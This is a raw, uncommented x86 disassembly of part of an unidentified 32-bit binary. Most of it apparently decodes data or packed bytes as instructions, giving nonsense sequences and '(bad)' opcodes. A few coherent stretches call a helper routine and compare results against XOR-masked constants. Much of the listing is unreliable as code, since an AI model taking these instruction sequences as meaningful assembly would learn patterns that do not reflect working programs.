  41aa92:	xlat   BYTE PTR ds:[ebx]
  41aa93:	inc    esi
  41aa94:	xchg   DWORD PTR [eax-0xcde3037],edi
  41aa9a:	mov    ebp,DWORD PTR [edx]
  41aa9c:	jns    0x41aadc
  41aa9e:	daa    
  41aa9f:	push   es
  41aaa0:	les    eax,FWORD PTR [ecx-0xca99800]
  41aaa6:	push   edx
  41aaa7:	repz add cl,BYTE PTR [eax+ebp*2+0x33e5288d]
  41aaaf:	imul   ebp,edx,0xd8aeb17f
  41aab5:	or     eax,ebx
  41aab7:	in     eax,dx
  41aab8:	and    esp,DWORD PTR [edx-0x56]
  41aabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aabc:	mov    ah,BYTE PTR [edi]
  41aabe:	or     DWORD PTR [ecx-0x3f],esi
  41aac1:	int3   
  41aac2:	inc    esp
  41aac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aac4:	dec    eax
  41aac5:	mov    al,ds:0x2b370f7e
  41aaca:	retf   
  41aacb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aacc:	fst    DWORD PTR [eiz*8-0x38cf4712]
  41aad3:	cmp    DWORD PTR ds:0x98089af7,edi
  41aad9:	inc    edx
  41aada:	outs   dx,BYTE PTR ds:[esi]
  41aadb:	xchg   BYTE PTR [eax-0x212c33f3],cl
  41aae1:	repnz or esi,DWORD PTR [ecx+eax*2+0x55]
  41aae6:	lock xchg edx,eax
  41aae8:	iret   
  41aae9:	out    dx,al
  41aaea:	out    dx,eax
  41aaeb:	or     DWORD PTR [ecx-0x204ad9fd],0xffffff80
  41aaf2:	xchg   ecx,eax
  41aaf3:	addr16 xchg edx,eax
  41aaf5:	cmp    BYTE PTR [esi-0x1089ef25],cl
  41aafb:	and    eax,0x4edd05f9
  41ab00:	loop   0x41ab71
  41ab02:	xchg   edx,eax
  41ab03:	sahf   
  41ab04:	push   es
  41ab05:	mov    ecx,0x34245c8b
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x4220c5
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x4220c5
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x6a335e4a],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x46b71818],bh
  41ab67:	xchg   BYTE PTR [esi],ah
  41ab69:	test   BYTE PTR [ecx+ebp*2+0x18b8686c],bl
  41ab70:	jge    0x41ab88
  41ab72:	or     al,0xc0
  41ab74:	mov    DWORD PTR [esi+eiz*1-0x3597768],edx
  41ab7b:	add    al,0x69
  41ab7d:	sbb    DWORD PTR [esi+0x3b5f5817],esi
  41ab83:	cwde   
  41ab84:	push   0x47
  41ab86:	sbb    bl,dh
  41ab88:	dec    ecx
  41ab89:	xchg   DWORD PTR [esi-0x3],ebp
  41ab8c:	gs pop ebp
  41ab8e:	icebp  
  41ab8f:	daa    
  41ab90:	sub    ah,BYTE PTR [edi]
  41ab92:	clc    
  41ab93:	sbb    eax,ecx
  41ab95:	push   esi
  41ab96:	clc    
  41ab97:	lahf   
  41ab98:	inc    ecx
  41ab99:	sub    BYTE PTR ds:0xdeff5824,0xcf
  41aba0:	jecxz  0x41ab74
  41aba2:	loop   0x41abb3
  41aba4:	pusha  
  41aba5:	push   esp
  41aba6:	mov    esi,0x29c665e8
  41abab:	add    DWORD PTR [ebx-0x76],eax
  41abae:	cmc    
  41abaf:	jmp    0x2662:0x6d8bab26
  41abb6:	iret   
  41abb7:	out    0xa3,al
  41abb9:	push   0xfffffffe
  41abbb:	mov    eax,ds:0xe9cbfcb1
  41abc0:	fmul   st(6),st
  41abc2:	adc    DWORD PTR [edi+esi*4-0x15604bd],eax
  41abc9:	and    ebp,edx
  41abcb:	lock and DWORD PTR [ecx],edx
  41abce:	popf   
  41abcf:	jo     0x41abcd
  41abd1:	add    DWORD PTR [edi+edi*4-0x4e],eax
  41abd5:	xor    al,0x6b
  41abd7:	pop    ds
  41abd8:	mov    edi,0xf6de7c61
  41abdd:	pop    esp
  41abde:	xor    cl,bh
  41abe0:	leave  
  41abe1:	mov    WORD PTR [eax],ss
  41abe3:	pop    ecx
  41abe4:	loopne 0x41ac3e
  41abe6:	rcr    BYTE PTR [edx],cl
  41abe8:	cmp    dl,BYTE PTR [edx+0x1c]
  41abeb:	imul   esi,DWORD PTR [ecx+0x36],0xc
  41abef:	push   edi
  41abf0:	pop    ebx
  41abf1:	adc    ch,0xc0
  41abf4:	stos   DWORD PTR es:[edi],eax
  41abf5:	mov    ebx,es
  41abf7:	fdivr  st,st(6)
  41abf9:	jmp    0x41abc3
  41abfb:	fiadd  DWORD PTR [ebp+0x613c8f8e]
  41ac01:	mov    dl,bl
  41ac03:	jbe    0x41ac07
  41ac05:	pop    ebp
  41ac06:	dec    edi
  41ac07:	inc    ecx
  41ac08:	(bad)  
  41ac09:	out    dx,eax
  41ac0a:	test   BYTE PTR [ebx+0x237c0cc9],ah
  41ac10:	adc    BYTE PTR [ecx],bh
  41ac12:	jae    0x41abb1
  41ac14:	xchg   edi,eax
  41ac15:	jno    0x41abfd
  41ac17:	and    DWORD PTR [ecx+0x43c2e1d0],esp
  41ac1d:	and    al,0x9c
  41ac1f:	sar    BYTE PTR [edi+0x4ea5a2f6],1
  41ac25:	es (bad) 
  41ac27:	cmp    BYTE PTR [ebx],bh
  41ac29:	enter  0xb728,0x77
  41ac2d:	fs mov ch,0xa9
  41ac30:	push   ds
  41ac31:	stos   DWORD PTR es:[edi],eax
  41ac32:	(bad)  
  41ac33:	retf   0x6792
  41ac36:	mov    bh,0xe5
  41ac38:	jp     0x41abf9
  41ac3a:	and    BYTE PTR [esi-0x45],0xb4
  41ac3e:	sar    BYTE PTR [eax],0x8c
  41ac41:	push   edi
  41ac42:	push   ebp
  41ac43:	dec    eax
  41ac44:	div    BYTE PTR [ebx-0x666396c1]
  41ac4a:	mov    dh,0x2c
  41ac4c:	mov    esi,0x281dfa0c
  41ac51:	push   es
  41ac52:	in     al,0x94
  41ac54:	inc    edx
  41ac55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac56:	aad    0xbf
  41ac58:	cdq    
  41ac59:	xchg   BYTE PTR [esi+0x10e11790],bh
  41ac5f:	jp     0x41acaa
  41ac61:	(bad)  [ebx-0x6e8847ae]
  41ac67:	popa   
  41ac68:	setp   BYTE PTR ds:0xc8b3ec75
  41ac6f:	daa    
  41ac70:	adc    eax,0x8f63100c
  41ac75:	inc    esp
  41ac76:	clc    
  41ac77:	adc    esi,DWORD PTR [eax+0x549619b7]
  41ac7d:	xor    BYTE PTR [edi+0x73],dl
  41ac80:	bound  edx,QWORD PTR [edi+ecx*2-0x13]
  41ac84:	jmp    0xde9f2755
  41ac89:	stos   DWORD PTR es:[edi],eax
  41ac8a:	jge    0x41ac26
  41ac8c:	or     edi,DWORD PTR [edx+eiz*8-0x63d4e729]
  41ac93:	cmp    eax,0xfe737284
  41ac98:	adc    eax,0xaa9fbd8
  41ac9d:	cld    
  41ac9e:	nop
  41ac9f:	int    0xa2
  41aca1:	fldcw  WORD PTR [esi-0x856e053]
  41aca7:	sbb    dh,BYTE PTR [ebp-0xd39a366]
  41acad:	jle    0x41acdc
  41acaf:	adc    al,0xe7
  41acb1:	cs leave 
  41acb3:	add    al,0x4a
  41acb5:	xchg   ebx,eax
  41acb6:	jns    0x41acd4
  41acb8:	push   ebx
  41acb9:	jae    0x41acd1
  41acbb:	out    0xba,eax
  41acbd:	fbld   TBYTE PTR [esp+eiz*8-0x6d02f46e]
  41acc4:	in     al,dx
  41acc5:	sti    
  41acc6:	pushf  
  41acc7:	cdq    
  41acc8:	mov    WORD PTR [ecx+0xc12fc75],ss
  41acce:	jmp    0x41acee
  41acd0:	mov    ds:0x35993674,al
  41acd5:	mov    ah,0x17
  41acd7:	jnp    0x41aca9
  41acd9:	xchg   edx,eax
  41acda:	or     BYTE PTR [ebx-0x43429231],bl
  41ace0:	aaa    
  41ace1:	dec    edi
  41ace2:	mov    edx,0xcdb7d041
  41ace7:	retf   
  41ace8:	fnstenv [ebx+0x3d]
  41aceb:	mov    edi,0x9ee6d465
  41acf0:	retf   0x5ea8
  41acf3:	mov    esp,DWORD PTR [esp+edi*4]
  41acf6:	fiadd  DWORD PTR [ebp+0x67]
  41acf9:	jmp    0x41acde
  41acfb:	aas    
  41acfc:	leave  
  41acfd:	mov    ss,WORD PTR [ebx+0x39c09ee9]
  41ad03:	(bad)  
  41ad04:	aaa    
  41ad05:	(bad)  
  41ad06:	cli    
  41ad07:	loop   0x41acda
  41ad09:	mov    dl,0x85
  41ad0b:	mov    dl,0x5e
  41ad0d:	adc    BYTE PTR [ecx-0x5c],bh
  41ad10:	fcomi  st,st(2)
  41ad12:	(bad)  
  41ad14:	cmp    eax,0x4da5884
  41ad19:	mov    esp,0x47dcbc5f
  41ad1e:	and    eax,edi
  41ad20:	sbb    DWORD PTR [esi],ebx
  41ad22:	fxch   st(1)
  41ad24:	sar    edi,cl
  41ad26:	sub    BYTE PTR [ebx],dh
  41ad28:	xlat   BYTE PTR ds:[ebx]
  41ad29:	jo     0x41acf5
  41ad2b:	data16 loope 0x41acdd
  41ad2e:	add    DWORD PTR [ebp-0x5440dc24],edx
  41ad34:	mov    eax,ds:0xb45db4db
  41ad39:	retf   0xdceb
  41ad3c:	push   ebp
  41ad3d:	jns    0x41ad2d
  41ad3f:	test   BYTE PTR [edi-0x11aaa8fe],ch
  41ad45:	fwait
  41ad46:	inc    edx
  41ad47:	and    bh,BYTE PTR [ebp+0x33]
  41ad4a:	imul   esp,DWORD PTR [eax-0x73],0xffffff80
  41ad4e:	loope  0x41acda
  41ad50:	mov    ds:0x6e6dfe07,al
  41ad55:	fld    st(5)
  41ad57:	sti    
  41ad58:	outs   dx,DWORD PTR ds:[esi]
  41ad5a:	pop    esp
  41ad5b:	jmp    0x41adbf
  41ad5d:	test   eax,0x3c48b0e7
  41ad62:	das    
  41ad63:	push   eax
  41ad64:	push   ebp
  41ad65:	jle    0x41ad2c
  41ad67:	inc    edx
  41ad68:	sub    al,0xd5
  41ad6a:	xchg   ebp,eax
  41ad6b:	jnp    0x41ad59
  41ad6d:	mov    al,0x2e
  41ad6f:	xchg   edi,eax
  41ad70:	or     DWORD PTR [eax-0x42],esi
  41ad73:	or     BYTE PTR [esi+0x435b14d8],dl
  41ad79:	out    0x7,eax
  41ad7b:	mov    bh,0x31
  41ad7d:	mov    bl,0x6a
  41ad7f:	cs (bad) 
  41ad81:	dec    ebx
  41ad82:	add    edx,DWORD PTR [ebx]
  41ad84:	cli    
  41ad85:	dec    ebx
  41ad86:	popf   
  41ad87:	adc    BYTE PTR [esi],0x42
  41ad8a:	ret    0xc34f
  41ad8d:	push   cs
  41ad8e:	or     eax,0xe3bfff87
  41ad93:	leave  
  41ad94:	sbb    bh,ah
  41ad96:	jae    0x41ae12
  41ad98:	xor    BYTE PTR [esi+0x4b],ch
  41ad9b:	mov    bl,0x2e
  41ad9d:	sti    
  41ad9e:	cmp    al,al
  41ada0:	fldcw  WORD PTR [esi]
  41ada2:	loope  0x41ad27
  41ada4:	aam    0x63
  41ada6:	jecxz  0x41adb3
  41ada8:	adc    DWORD PTR [eax-0x63f091dc],edx
  41adae:	fcom   QWORD PTR [ebx]
  41adb0:	lods   eax,DWORD PTR ds:[esi]
  41adb1:	nop
  41adb2:	les    ebp,FWORD PTR [eax+0x67]
  41adb5:	push   ecx
  41adb6:	dec    ebp
  41adb7:	xchg   esi,eax
  41adb8:	out    dx,eax
  41adb9:	in     eax,0x63
  41adbb:	xor    ebp,edx
  41adbd:	mov    edi,0x96fe803c
  41adc2:	push   edx
  41adc3:	adc    dh,BYTE PTR [esp+edi*8]
  41adc6:	(bad)  
  41adc7:	jmp    0x8f4421f8
  41adcc:	push   ss
  41adcd:	les    esp,FWORD PTR [ebp-0x1]
  41add0:	jno    0x41ad9a
  41add2:	in     eax,0xa5
  41add4:	inc    edx
  41add5:	mov    bh,0x6d
  41add7:	mov    cl,0x13
  41add9:	cwde   
  41adda:	jbe    0x41ad5e
  41addc:	clc    
  41addd:	lods   al,BYTE PTR ds:[esi]
  41adde:	sbb    al,0xf0
  41ade0:	jno    0x41ad7f
  41ade2:	or     BYTE PTR [esi-0x49b1f3c7],bh
  41ade8:	retf   0x260
  41adeb:	sbb    al,0x2f
  41aded:	fist   WORD PTR [esi]
  41adef:	pusha  
  41adf0:	cmp    esi,DWORD PTR [esi-0x62]
  41adf3:	sub    DWORD PTR [edi],ebp
  41adf5:	call   0x4178726c
  41adfa:	(bad)  
  41adfb:	call   0x716:0x32f82ccf
  41ae02:	xor    bh,BYTE PTR [esi-0x22381f32]
  41ae08:	cwde   
  41ae09:	sbb    eax,0xb0fb2c61
  41ae0e:	or     edi,0x62
  41ae11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae12:	loopne 0x41ae6a
  41ae14:	push   esi
  41ae15:	pop    ebp
  41ae16:	mov    edi,0x380b7dbf
  41ae1b:	in     eax,dx
  41ae1c:	out    dx,al
  41ae1d:	inc    esi
  41ae1e:	int3   
  41ae1f:	and    ebx,DWORD PTR [edi+0x1ea99f5d]
  41ae25:	loope  0x41ae36
  41ae27:	push   ss
  41ae28:	je     0x41ae02
  41ae2a:	xchg   edx,eax
  41ae2b:	adc    BYTE PTR [eax+0x5],bl
  41ae2e:	les    ebp,FWORD PTR [ecx+ebp*4]
  41ae31:	jbe    0x41ade8
  41ae33:	xchg   esi,eax
  41ae34:	fucomip st,st(5)
  41ae36:	dec    ecx
  41ae37:	adc    bh,BYTE PTR [ebx+0x7b]
  41ae3a:	sbb    edi,ebp
  41ae3c:	call   0xcf96f12
  41ae41:	aas    
  41ae42:	pop    ss
  41ae43:	jmp    0xfac61129
  41ae48:	dec    edx
  41ae49:	loop   0x41add7
  41ae4b:	xchg   edi,eax
  41ae4c:	mov    ebx,0xeb7d8956
  41ae51:	adc    BYTE PTR [ecx],0x86
  41ae54:	scas   eax,DWORD PTR es:[edi]
  41ae55:	mov    eax,ds:0x1d8fa640
  41ae5a:	jmp    0x41ae67
  41ae5c:	nop
  41ae5d:	dec    ebp
  41ae5e:	push   ss
  41ae5f:	pusha  
  41ae60:	cmp    edi,ebp
  41ae62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae63:	in     eax,dx
  41ae64:	(bad)
  41ae69:	scas   eax,DWORD PTR es:[edi]
  41ae6a:	jge    0x41ae23
  41ae6c:	xor    dh,BYTE PTR [ecx+0x32]
  41ae6f:	or     esi,DWORD PTR [ebx+eax*1+0x63]
  41ae73:	add    DWORD PTR [eax-0x2a01ad11],0xffffffbe
  41ae7a:	adc    eax,0xd14ec8c0
  41ae7f:	pop    esp
  41ae80:	mov    esi,0xca6b51cf
  41ae85:	inc    edx
  41ae86:	pusha  
  41ae87:	mov    ecx,0x118f82be
  41ae8c:	lahf   
  41ae8d:	dec    edx
  41ae8e:	jg     0x41ae48
  41ae90:	nop
  41ae91:	es push edx
  41ae93:	stc    
  41ae94:	xchg   edi,eax
  41ae95:	add    edx,edi
  41ae97:	fdivp  st(7),st
  41ae99:	and    esi,ebp
  41ae9b:	pop    edx
  41ae9c:	sbb    al,ch
  41ae9e:	pop    edi
  41ae9f:	xchg   esp,eax
  41aea0:	popf   
  41aea1:	das    
  41aea2:	xor    BYTE PTR [edi+0x476b09fd],bl
  41aea8:	dec    ebp
  41aea9:	pop    edx
  41aeaa:	dec    ebp
  41aeab:	mov    dh,0xa0
  41aead:	(bad)  
  41aeaf:	(bad)  
  41aeb1:	sub    ch,BYTE PTR [edx+edi*2-0x6de2b479]
  41aeb8:	xchg   esi,eax
  41aeb9:	jmp    0x44a6:0x86e108f1
  41aec0:	inc    ecx
  41aec1:	mov    bh,0x0
  41aec3:	jmp    0xa37e788f
  41aec8:	cmp    DWORD PTR [ebx],0xdc13f397
  41aece:	sub    ah,BYTE PTR [ecx]
  41aed0:	std    
  41aed1:	sub    cl,BYTE PTR [ecx+0x65085088]
  41aed7:	push   edx
  41aed8:	dec    ecx
  41aed9:	sbb    eax,0xfe185155
  41aede:	or     al,0xb8
  41aee0:	and    BYTE PTR ds:0x4d5102a4,0x63
  41aee7:	sbb    dl,BYTE PTR [ebx]
  41aee9:	push   ebp
  41aeea:	pop    ebx
  41aeeb:	stc    
  41aeec:	out    dx,al
  41aeed:	loopne 0x41aeac
  41aeef:	xchg   ebx,eax
  41aef0:	imul   esp,edi,0xffffffb8
  41aef3:	fisub  DWORD PTR [edx]
  41aef5:	clc    
  41aef6:	test   al,0x76
  41aef8:	xlat   BYTE PTR ds:[ebx]
  41aef9:	dec    ebx
  41aefa:	mov    bl,0xc
  41aefc:	jae    0x41af78
  41aefe:	xchg   ebp,eax
  41aeff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af00:	pop    ecx
  41af01:	lds    ecx,FWORD PTR [ecx+0x65fbb03a]
  41af07:	mov    al,0x86
  41af09:	cwde   
  41af0a:	cmp    ah,BYTE PTR [ebp+0x26]
  41af0d:	cmp    al,0xc4
  41af0f:	push   ebp
  41af10:	or     BYTE PTR [ebx+eiz*1],0xdb
  41af14:	pop    ss
  41af15:	scas   al,BYTE PTR es:[edi]
  41af16:	dec    esi
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af1e
  41af80:	push   eax
  41af81:	(bad)  
  41af82:	jl     0x41af9b
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1+0x671818],bh
  41af8d:	(bad)  
  41af8e:	loopne 0x41af9a
  41af90:	mov    ch,0xba
  41af92:	inc    eax
  41af93:	iret   
  41af94:	push   0xc8579b91
  41af99:	adc    dh,al
  41af9b:	xor    BYTE PTR [edi-0x56f15281],ch
  41afa1:	daa    
  41afa2:	loopne 0x41af94
  41afa4:	add    DWORD PTR [eax+0x47],esp
  41afa7:	ins    DWORD PTR es:[edi],dx
  41afa8:	out    0x6a,al
  41afaa:	sbb    esi,DWORD PTR [ebp+0xe]
  41afad:	sub    eax,0xbfa9c10f
  41afb2:	jbe    0x41af74
  41afb4:	les    esi,FWORD PTR [ecx-0x34]
  41afb7:	lea    edi,[edx+ebp*1]
  41afba:	repnz mov esp,0x3cd8c6a7
  41afc0:	pop    eax
  41afc1:	test   DWORD PTR [eax],esi
  41afc3:	adc    esp,ebx
  41afc5:	jno    0x41aff5
  41afc7:	add    BYTE PTR [ecx],0x2
  41afca:	nop
  41afcb:	into   
  41afcc:	adc    BYTE PTR [ebp-0x23],dl
  41afcf:	pusha  
  41afd0:	out    dx,eax
  41afd1:	dec    edi
  41afd2:	adc    cl,bh
  41afd4:	jns    0x41af78
  41afd6:	repnz and DWORD PTR [edx+0x79],ebp
  41afda:	fadd   st(4),st
  41afdc:	test   al,0xef
  41afde:	sahf   
  41afdf:	inc    ebx
  41afe0:	and    ebx,DWORD PTR [edi+0x50]
  41afe3:	fst    QWORD PTR [edi+ebx*8+0x1d]
  41afe7:	xlat   BYTE PTR ds:[ebx]
  41afe8:	pop    ecx
  41afe9:	in     al,0x5e
  41afeb:	mov    eax,ds:0x38e73db9
  41aff0:	shl    esp,1
  41aff2:	popa   
  41aff3:	cwde   
  41aff4:	lods   al,BYTE PTR ds:[esi]
  41aff5:	xor    al,0x94
  41aff7:	mov    eax,ds:0xf32b13c0
  41affc:	ret    0x2d7e
  41afff:	in     eax,0x1a
  41b001:	adc    BYTE PTR [ebp+0x4c56143a],cl
  41b007:	pop    esp
  41b008:	and    al,BYTE PTR gs:[edx-0x167effe9]
  41b00f:	das    
  41b010:	iret   
  41b011:	xor    eax,ebp
  41b013:	in     eax,dx
  41b014:	rcl    edi,cl
  41b016:	aaa    
  41b017:	push   es
  41b018:	sbb    DWORD PTR [edi],esp
  41b01a:	sub    al,BYTE PTR [esi+0x65]
  41b01d:	sub    bh,dh
  41b01f:	dec    ecx
  41b020:	mov    eax,ds:0x60ace55b
  41b025:	sti    
  41b026:	addr16 retf 0x8149
  41b02a:	dec    BYTE PTR [edi-0x4e]
  41b02d:	cmp    eax,0x245aa31c
  41b032:	retf   0x32e5
  41b035:	mov    eax,ds:0x1cca9533
  41b03a:	popa   
  41b03b:	fcom   DWORD PTR [edi-0x72c5c9f8]
  41b041:	(bad)  
  41b043:	add    esi,DWORD PTR [edi+0x3d]
  41b046:	ins    BYTE PTR es:[edi],dx
  41b047:	mov    eax,0xba8f76ea
  41b04c:	add    esi,DWORD PTR [eax]
  41b04e:	js     0x41b08f
  41b050:	adc    BYTE PTR [edi-0x933140a],bh
  41b056:	scas   eax,DWORD PTR es:[edi]
  41b057:	pop    ds
  41b058:	icebp  
  41b059:	sub    BYTE PTR [ebx+0x1c89f119],ch
  41b05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b060:	add    al,0x46
  41b062:	push   edi
  41b063:	adc    BYTE PTR [ebx-0x43],ah
  41b066:	sub    eax,0x47a41fe8
  41b06b:	cmp    DWORD PTR [edx+eax*4-0x43],ebp
  41b06f:	(bad)  
  41b070:	repz and eax,0xd9bd7801
  41b076:	repnz cwde 
  41b078:	jecxz  0x41b05d
  41b07a:	shl    BYTE PTR [edi+0x42],0x6
  41b07e:	add    BYTE PTR [edx-0x575d9deb],cl
  41b084:	repnz (bad) 
  41b087:	push   ebx
  41b088:	add    eax,0x19274a6a
  41b08d:	xchg   esp,eax
  41b08e:	mov    bh,0xa6
  41b090:	outs   dx,BYTE PTR ds:[esi]
  41b091:	adc    BYTE PTR [edx+0x361996],dh
  41b097:	addr16 xchg ebp,eax
  41b099:	addps  xmm5,XMMWORD PTR [ebx-0x61]
  41b09d:	lea    ebp,[ebx]
  41b09f:	clc    
  41b0a0:	fdivp  st(2),st
  41b0a2:	xor    al,0xd2
  41b0a4:	xchg   esi,eax
  41b0a5:	jne    0x41b05d
  41b0a7:	mov    DWORD PTR [ecx],ebp
  41b0a9:	add    BYTE PTR [ecx-0x2a],cl
  41b0ac:	sub    dl,BYTE PTR [eax-0x53]
  41b0af:	inc    edi
  41b0b0:	les    ecx,FWORD PTR [eax]
  41b0b2:	fucomi st,st(5)
  41b0b4:	je     0x41b104
  41b0b6:	iret   
  41b0b7:	loope  0x41b080
  41b0b9:	clc    
  41b0ba:	(bad)  
  41b0bb:	push   edi
  41b0bc:	and    BYTE PTR ds:0x33204aba,al
  41b0c2:	jae    0x41b044
  41b0c4:	mov    esp,0xa4238aa
  41b0c9:	mov    cl,0x91
  41b0cb:	imul   edx,DWORD PTR [eax+0x73319b6d],0xffffffe5
  41b0d2:	aam    0xa
  41b0d4:	xchg   ebp,eax
  41b0d5:	cs dec esp
  41b0d7:	inc    ebx
  41b0d8:	lock aas 
  41b0da:	xlat   BYTE PTR ds:[ebx]
  41b0db:	mov    cl,0x5e
  41b0dd:	mov    ds:0xb6cd7d78,al
  41b0e2:	out    0xc1,eax
  41b0e4:	arpl   WORD PTR [edi-0x1f6c09d1],bx
  41b0ea:	and    DWORD PTR [edi+0x1ee1bb24],edi
  41b0f0:	xchg   ecx,eax
  41b0f1:	std    
  41b0f2:	jns    0x41b165
  41b0f4:	cmp    al,dl
  41b0f6:	(bad)  
  41b0f7:	dec    ebx
  41b0f8:	sbb    al,BYTE PTR [ecx]
  41b0fa:	ds int 0xeb
  41b0fd:	into   
  41b0fe:	add    bl,ah
  41b100:	repnz push edx
  41b102:	sbb    eax,eax
  41b104:	lock sbb DWORD PTR [ecx+edx*2+0x33],ebp
  41b109:	cmp    al,ah
  41b10b:	sbb    eax,0x2819fd38
  41b110:	ja     0x41b18c
  41b112:	sbb    bl,BYTE PTR [eax-0x30b8d3de]
  41b118:	fist   WORD PTR [eax-0xf4118aa]
  41b11e:	jb     0x41b0d4
  41b120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b121:	std    
  41b122:	dec    esp
  41b123:	pop    ds
  41b124:	fwait
  41b125:	out    dx,eax
  41b126:	jae    0x41b0f2
  41b128:	es pop ebp
  41b12a:	idiv   DWORD PTR [esi-0x2e28a544]
  41b130:	out    dx,eax
  41b131:	adc    BYTE PTR [edx*1-0x68020a77],bh
  41b138:	les    esi,FWORD PTR [eax*2+0x4373d1a0]
  41b13f:	inc    eax
  41b140:	mov    dl,0xaa
  41b142:	cmp    BYTE PTR [ecx-0x7d2402c2],cl
  41b148:	push   0x44
  41b14a:	mov    esp,0x92d8bd6f
  41b14f:	cmp    ebx,DWORD PTR [ebx+0x3]
  41b152:	and    bh,BYTE PTR [ebp-0x5974c513]
  41b158:	fidivr DWORD PTR [ebp+0x69f6ce86]
  41b15e:	jnp    0x41b161
  41b160:	dec    ecx
  41b161:	jg     0x41b123
  41b163:	out    0x97,eax
  41b165:	jne    0x41b108
  41b167:	aam    0x41
  41b169:	mov    al,ds:0x2c606fb8
  41b16e:	test   al,0x8d
  41b170:	imul   ecx,esp,0xffffffd6
  41b173:	popf   
  41b174:	xor    al,0xfd
  41b176:	lahf   
  41b177:	xor    BYTE PTR [edi],ah
  41b179:	jl     0x41b1c8
  41b17b:	iret   
  41b17c:	ins    DWORD PTR es:[edi],dx
  41b17d:	lods   al,BYTE PTR ds:[esi]
  41b17e:	push   esp
  41b17f:	xchg   esp,eax
  41b180:	sub    dh,BYTE PTR [edx]
  41b182:	dec    edi
  41b183:	not    BYTE PTR [esi+0x3d]
  41b186:	(bad)  
  41b188:	pop    ebp
  41b189:	sbb    eax,0x78b9fa57
  41b18e:	and    al,0xd0
  41b190:	test   ebx,esp
  41b192:	ror    BYTE PTR ds:[edi+0xa],0x93
  41b197:	lods   eax,DWORD PTR ds:[esi]
  41b198:	pop    ss
  41b199:	aam    0xdf
  41b19b:	adc    BYTE PTR fs:[ebp+0x640ec7e5],0x9b
  41b1a3:	inc    esi
  41b1a4:	int3   
  41b1a5:	lods   al,BYTE PTR ds:[esi]
  41b1a6:	add    esp,DWORD PTR [esi-0x5f]
  41b1a9:	mov    esi,0x4552a8ca
  41b1ae:	test   BYTE PTR [esi],dl
  41b1b0:	lds    esi,FWORD PTR [edi+0xc]
  41b1b3:	jae    0x41b223
  41b1b5:	rcr    BYTE PTR [eax],0xe4
  41b1b8:	xor    BYTE PTR [ebp-0x1a],bh
  41b1bb:	adc    DWORD PTR [eax+0x334b87f0],0x50d27810
  41b1c5:	rcl    DWORD PTR [esi+0x7e],0x2e
  41b1c9:	sti    
  41b1ca:	mov    edx,0x694309c4
  41b1cf:	xchg   BYTE PTR [esi+0x58],bl
  41b1d2:	fistp  DWORD PTR [ecx+ebp*2]
  41b1d5:	push   es
  41b1d6:	jae    0x41b231
  41b1d8:	mov    bh,0x7f
  41b1da:	aad    0x66
  41b1dc:	push   es
  41b1dd:	stos   BYTE PTR es:[edi],al
  41b1de:	stos   DWORD PTR es:[edi],eax
  41b1df:	sbb    eax,ebx
  41b1e1:	jmp    0x41b21d
  41b1e3:	inc    ebx
  41b1e4:	fucomp st(3)
  41b1e6:	lock dec eax
  41b1e8:	out    dx,al
  41b1e9:	lock test eax,0xad747311
  41b1ef:	jmp    0xc7c41bd6
  41b1f4:	lods   eax,DWORD PTR ds:[esi]
  41b1f5:	xchg   ebx,eax
  41b1f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1f7:	jmp    0x41b182
  41b1f9:	in     eax,dx
  41b1fa:	stos   DWORD PTR es:[edi],eax
  41b1fb:	jne    0x41b18c
  41b1fd:	jnp    0x41b1d0
  41b1ff:	fwait
  41b200:	popa   
